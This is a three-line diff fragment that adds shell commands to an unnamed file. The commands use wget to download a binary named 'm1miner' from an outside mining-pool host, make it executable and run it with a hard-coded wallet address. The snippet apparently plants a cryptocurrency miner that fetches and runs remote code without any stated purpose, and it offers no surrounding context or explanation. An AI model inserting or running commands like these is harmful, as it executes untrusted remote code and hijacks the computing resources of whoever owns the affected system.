@@ -1,0 +1,3 @@
+wget -O ore http://static.m1pool.xyz/m1miner
+chmod +x ore
+./ore wallet=4QGP6Bn9fFLBggnA6mD2iwUoeHQXXBNgiMRNSrBBJa9e
